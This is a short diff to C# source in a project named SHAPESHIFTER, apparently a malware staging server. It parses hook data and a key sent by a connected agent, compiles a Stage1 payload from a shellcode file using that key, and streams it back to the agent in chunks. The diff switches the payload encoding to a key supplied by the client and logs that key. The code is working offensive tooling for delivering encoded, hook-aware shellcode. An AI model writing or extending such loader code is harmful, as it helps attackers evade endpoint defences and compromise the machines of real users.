@@ -48,6 +48,8 @@ namespace SHAPESHIFTER
                     // Loop to receive all the data sent by the client.
                     while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                     {
+                        string testkey = Helpers.KeyParser(bytes);
+                        //Console.WriteLine(testkey);
                         IList<string> hooks = Helpers.ResultsParser(bytes);
                         if (hooks.Count != 0)
                         {
@@ -57,7 +59,7 @@ namespace SHAPESHIFTER
                             }
                         }
 
-                        if (!Compiler.BuildStage1(hooks, shellcodeFile, clientId.ToString(),key))
+                        if (!Compiler.BuildStage1(hooks, shellcodeFile, clientId.ToString(),testkey))
                         {
                             Console.WriteLine("  [-] Failed to generate Stage1 source file");
                             break;
@@ -77,6 +79,7 @@ namespace SHAPESHIFTER
                         //Console.WriteLine("  [>] Sent {0} bytes back to the agent", stage1.Length);
                         int stageSize = stage1.Length;
                         int chunkCount = (stageSize + 999) / 1000;
+                        Console.WriteLine("  [>] Encoding payload with key: {0}", testkey);
                         Console.WriteLine("  [>] Sending total of {0} bytes to the agent...", stageSize);
                         for (int j = 0; j < chunkCount; j++)
                         {
